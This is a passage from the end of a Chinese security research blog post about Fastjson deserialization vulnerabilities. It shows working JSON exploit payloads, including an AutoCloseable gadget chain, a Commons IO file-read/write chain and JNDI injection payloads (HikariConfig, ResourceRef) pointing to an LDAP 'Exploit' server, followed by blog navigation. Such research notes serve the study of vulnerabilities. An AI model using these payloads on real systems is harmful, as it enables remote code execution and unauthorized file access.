        &quot;buffer&quot;: &quot;aGVsbDA=&quot;,
        &quot;outputStream&quot;: &#123;
            &quot;$ref&quot;: &quot;$.stream&quot;
        &#125;,
        &quot;position&quot;: 5  //字符长度
    &#125;,
    &quot;close&quot;: &#123;
        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
        &quot;@type&quot;: &quot;com.sleepycat.bind.serial.SerialOutput&quot;,
        &quot;out&quot;: &#123;
            &quot;$ref&quot;: &quot;$.writer&quot;
        &#125;
    &#125;
&#125;
</code></pre>
<h3 id="Commons-IO-2-x-写文件"><a href="#Commons-IO-2-x-写文件" class="headerlink" title="Commons IO 2.x 写文件"></a>Commons IO 2.x 写文件</h3><p>参考<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/376759650">https://zhuanlan.zhihu.com/p/376759650</a></p>
<p>暂时不想写</p>
<p>环境搭建</p>
<pre><code class="xml">&lt;dependency&gt;
    &lt;groupId&gt;commons-io&lt;/groupId&gt;
    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;
    &lt;version&gt;2.1&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>POC</p>
<pre><code class="json">&#123;
    &quot;abc&quot;: &#123;
        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
        &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,
        &quot;delegate&quot;: &#123;
            &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,
            &quot;reader&quot;: &#123;
                &quot;@type&quot;: &quot;jdk.nashorn.api.scripting.URLReader&quot;,
                &quot;url&quot;: &quot;file:///D:/1.txt&quot;
            &#125;,
            &quot;charsetName&quot;: &quot;UTF-8&quot;,
            &quot;bufferSize&quot;: 1024
        &#125;,
        &quot;boms&quot;: [&#123;
            &quot;charsetName&quot;: &quot;UTF-8&quot;,
            &quot;bytes&quot;: [66]
        &#125;]
    &#125;,
    &quot;address&quot;: &#123;
        &quot;$ref&quot;: &quot;$.abc.BOM&quot;
    &#125;
&#125;
</code></pre>
<h3 id="其他POC"><a href="#其他POC" class="headerlink" title="其他POC"></a>其他POC</h3><p>均需要开启AutoType，且会被JNDI注入利用所受的JDK版本限制</p>
<p>org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig类PoC：</p>
<pre><code class="json">&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;
或
&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;
</code></pre>
<p>com.caucho.config.types.ResourceRef类PoC：</p>
<pre><code class="json">&#123;&quot;@type&quot;:&quot;com.caucho.config.types.ResourceRef&quot;,&quot;lookupName&quot;: &quot;ldap://localhost:1389/Exploit&quot;, &quot;value&quot;: &#123;&quot;$ref&quot;:&quot;$.value&quot;&#125;&#125;
</code></pre>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Tree</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/08/15/Fastjson%E7%B3%BB%E5%88%97/">http://example.com/2023/08/15/Fastjson系列/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Tree's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java/">Java</a></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/todis21/image/main/wallhaven-85965k_1920x1080.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/08/21/Tomcat%E7%B3%BB%E5%88%97/" title="Tomcat系列"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-l8j592_2560x1440.png" onerror="onerror=null;src='/img/404.png'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Tomcat系列</div></div></a></div><div class="next-post pull-right"><a href="/2023/08/02/Laravel%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/" title="Laravel漏洞合集"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-5gm5p5_2560x1440.png" onerror="onerror=null;src='/img/404.png'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Laravel漏洞合集</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/04/04/CommonCollections1/" title="CommonCollections1"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202304051554165.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-04</div><div class="title">CommonCollections1</div></div></a></div><div><a href="/2023/08/02/Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%90%88%E9%9B%86/" title="Commons-Collections反序列化链合集"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-j3eemp_2560x1440.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-02</div><div class="title">Commons-Collections反序列化链合集</div></div></a></div><div><a href="/2023/06/23/CommonsCollections2/" title="CommonsCollections2"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-yjvgzd_2560x1600.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-23</div><div class="title">CommonsCollections2</div></div></a></div><div><a href="/2023/04/06/CommonsCollections6/" title="CommonsCollections6"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202304062210726.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-06</div><div class="title">CommonsCollections6</div></div></a></div><div><a href="/2023/04/08/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="Fastjson漏洞分析"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202304092013733.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-08</div><div class="title">Fastjson漏洞分析</div></div></a></div><div><a href="/2023/03/19/JNDI%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" title="JNDI注入学习"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202303212056761.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-19</div><div class="title">JNDI注入学习</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.jfif" onerror="this.onerror=null;this.src='/img/404.png'" alt="avatar"/></div><div class="author-info__name">Tree</div><div class="author-info__description">随便都行都可以</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">48</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/todis21"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/todis21" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:3440848736@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#FastJson%E7%B3%BB%E5%88%97"><span class="toc-number">1.</span> <span class="toc-text">FastJson系列</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.1.</span> <span class="toc-text">序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.2.</span> <span class="toc-text">反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.3.</span> <span class="toc-text">反序列化流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9C%81%E6%B5%81"><span class="toc-number">1.1.4.</span> <span class="toc-text">省流</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson-lt-x3D-1-2-24"><span class="toc-number">1.2.</span> <span class="toc-text">Fastjson&lt;&#x3D;1.2.24</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">1.2.1.</span> <span class="toc-text">JNDI利用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TemplatesImpl-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">1.2.2.</span> <span class="toc-text">TemplatesImpl 利用链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson1-2-25-1-2-41"><span class="toc-number">1.3.</span> <span class="toc-text">Fastjson1.2.25-1.2.41</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90"><span class="toc-number">1.3.1.</span> <span class="toc-text">绕过分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson1-2-25-1-2-42"><span class="toc-number">1.4.</span> <span class="toc-text">Fastjson1.2.25-1.2.42</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">绕过分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson1-2-25-1-2-43"><span class="toc-number">1.5.</span> <span class="toc-text">Fastjson1.2.25-1.2.43</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90-2"><span class="toc-number">1.5.1.</span> <span class="toc-text">绕过分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson1-2-25-1-2-45"><span class="toc-number">1.6.</span> <span class="toc-text">Fastjson1.2.25-1.2.45</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90-3"><span class="toc-number">1.6.1.</span> <span class="toc-text">绕过分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson1-2-25-1-2-47"><span class="toc-number">1.7.</span> <span class="toc-text">Fastjson1.2.25-1.2.47</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90-4"><span class="toc-number">1.7.1.</span> <span class="toc-text">绕过分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson1-2-25-1-2-59"><span class="toc-number">1.8.</span> <span class="toc-text">Fastjson1.2.25-1.2.59</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson1-2-25-1-2-61"><span class="toc-number">1.9.</span> <span class="toc-text">Fastjson1.2.25-1.2.61</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson1-2-25-1-2-62"><span class="toc-number">1.10.</span> <span class="toc-text">Fastjson1.2.25-1.2.62</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson1-2-25-1-2-66"><span class="toc-number">1.11.</span> <span class="toc-text">Fastjson1.2.25-1.2.66</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson1-2-25-1-2-67"><span class="toc-number">1.12.</span> <span class="toc-text">Fastjson1.2.25-1.2.67</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson1-2-25-1-2-68"><span class="toc-number">1.13.</span> <span class="toc-text">Fastjson1.2.25-1.2.68</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exception%E7%BB%95%E8%BF%87%EF%BC%88-gt-1-2-39%EF%BC%89"><span class="toc-number">1.13.1.</span> <span class="toc-text">Exception绕过（&gt;1.2.39）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AutoCloseable%E7%BB%95%E8%BF%87"><span class="toc-number">1.13.2.</span> <span class="toc-text">AutoCloseable绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mysql-RCE"><span class="toc-number">1.13.3.</span> <span class="toc-text">Mysql RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SafeFileOutputStream%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">1.13.4.</span> <span class="toc-text">SafeFileOutputStream文件操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="toc-number">1.13.5.</span> <span class="toc-text">文件写入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Commons-IO-2-x-%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">1.13.6.</span> <span class="toc-text">Commons IO 2.x 写文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96POC"><span class="toc-number">1.13.7.</span> <span class="toc-text">其他POC</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/09/04/Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java Agent内存马"><img src="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-5g3zl1_1920x1080.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Java Agent内存马"/></a><div class="content"><a class="title" href="/2023/09/04/Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java Agent内存马">Java Agent内存马</a><time datetime="2023-09-04T01:48:25.000Z" title="发表于 2023-09-04 09:48:25">2023-09-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/28/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" title="Tomcat内存马"><img src="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-1p2jl1_2560x1440.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Tomcat内存马"/></a><div class="content"><a class="title" href="/2023/08/28/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" title="Tomcat内存马">Tomcat内存马</a><time datetime="2023-08-28T13:12:37.000Z" title="发表于 2023-08-28 21:12:37">2023-08-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/21/Tomcat%E7%B3%BB%E5%88%97/" title="Tomcat系列"><img src="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-l8j592_2560x1440.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Tomcat系列"/></a><div class="content"><a class="title" href="/2023/08/21/Tomcat%E7%B3%BB%E5%88%97/" title="Tomcat系列">Tomcat系列</a><time datetime="2023-08-21T06:41:18.000Z" title="发表于 2023-08-21 14:41:18">2023-08-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/15/Fastjson%E7%B3%BB%E5%88%97/" title="Fastjson系列"><img src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-85965k_1920x1080.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Fastjson系列"/></a><div class="content"><a class="title" href="/2023/08/15/Fastjson%E7%B3%BB%E5%88%97/" title="Fastjson系列">Fastjson系列</a><time datetime="2023-08-15T08:46:08.000Z" title="发表于 2023-08-15 16:46:08">2023-08-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/02/Laravel%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/" title="Laravel漏洞合集"><img src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-5gm5p5_2560x1440.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Laravel漏洞合集"/></a><div class="content"><a class="title" href="/2023/08/02/Laravel%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/" title="Laravel漏洞合集">Laravel漏洞合集</a><time datetime="2023-08-02T13:51:54.000Z" title="发表于 2023-08-02 21:51:54">2023-08-02</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Tree</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><script type="text/javascript" id="maid-script" src="https://unpkg.com/mermaid@undefined/dist/mermaid.min.js?v=undefined"></script><script>if (window.mermaid) {
  var options = JSON.parse(document.getElementById('maid-script').getAttribute('mermaidoptioins'));
  mermaid.initialize(options);
}</script></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
  const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
  if ($mermaid.length === 0) return
  const runMermaid = () => {
    window.loadMermaid = true
    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

    Array.from($mermaid).forEach((item, index) => {
      const mermaidSrc = item.firstElementChild
      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
      const mermaidID = 'mermaid-' + index
      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent

      const renderFn = mermaid.render(mermaidID, mermaidDefinition)

      const renderV10 = () => {
        renderFn.then(({svg}) => {
          mermaidSrc.insertAdjacentHTML('afterend', svg)
        })
      }

      const renderV9 = svg => {
        mermaidSrc.insertAdjacentHTML('afterend', svg)
      }

      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
    })
  }

  const loadMermaid = () => {
    window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaid)
  }

  btf.addModeChange('mermaid', runMermaid)

  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="喵" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>